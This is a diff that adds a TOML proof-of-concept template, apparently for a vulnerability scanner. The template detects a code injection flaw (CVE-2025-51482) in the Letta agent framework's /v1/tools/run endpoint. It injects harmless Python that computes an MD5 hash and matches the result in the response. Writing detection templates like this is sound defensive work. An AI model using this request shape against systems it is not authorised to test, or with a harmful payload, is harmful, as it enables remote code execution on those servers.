@@ -1,0 +1,46 @@
+[info]
+author = "ave"
+description = "通过向 /v1/tools/run 接口发送特制JSON请求，注入Python代码计算MD5并验证返回结果，无损检测Letta 0.7.12及之前版本的代码注入漏洞（CVE-2025-51482）"
+id = "POC-AVE-2025-0032"
+name = "Letta AI代理框架 远程代码执行漏洞 PoC"
+severity = "high"
+tags = ["ave-2025-0032"]
+vuln_id = [
+    "CVE-2025-51482",
+    "AVE-2025-0032",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/v1/tools/run"
+protocol = "http"
+
+[poc.requests.body]
+content = """
+{"name":"nuclei","args":{},"json_schema":{"type":"object","properties":{}},"source_code":"def nuclei():
+    import hashlib
+    data='999999999'.encode('utf-8')
+    return ''+hashlib.md5(data).hexdigest()"}
+"""
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/json"
+
+[[poc.requests.matchers]]
+condition = "and"
+expect = true
+part = "body"
+type = "word"
+words = [
+    "c8c605999f3d8352d7bb792cf3fdb25b",
+    "tool_return",
+]
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
